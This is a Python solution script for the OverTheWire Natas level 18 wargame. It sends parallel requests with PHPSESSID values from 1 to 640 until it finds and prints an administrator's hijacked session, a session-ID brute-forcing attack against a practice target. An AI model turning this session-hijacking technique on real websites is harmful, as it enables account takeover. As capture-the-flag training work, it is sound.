import requests
from requests.auth import HTTPBasicAuth
import string
from concurrent.futures import ThreadPoolExecutor

url = 'http://natas18.natas.labs.overthewire.org/'
# The credentials for auth in the level
username = 'natas18'
password = 'passwordPlaceholder'

current_password = ""
last_password = None

session_range = range(1,641)

# Function to send a POST request with form data
def send_request(session_ID):
    try:
        form_data = {'username': 'admin',
                     'password': 'letmein'}
        cookies = {
            "PHPSESSID": str(session_ID)
        }

        response = requests.post(url, cookies=cookies, data=form_data, auth=HTTPBasicAuth(username, password))

        if "You are an admin." in response.text:
            return True, session_ID, response.text
        else:
            return False, session_ID, None

    except requests.exceptions.RequestException as e:
        return False, None, None

# Function to perform multiple requests in parallel
def perform_parallel_requests():
    # Create a ThreadPoolExecutor to handle multiple requests in parallel
    with ThreadPoolExecutor(max_workers= len(session_range)) as executor:
        # Submit request for each character
        futures = [executor.submit(send_request, i) for i in session_range]

        # Wait for all futures to complete and collect results
        for future in futures:
            admin, session, response = future.result()
            print(f"Session id: {session} | admin: {admin}")
            if admin:
                print(f"Hijacked Admin session: {response}")
                break

perform_parallel_requests()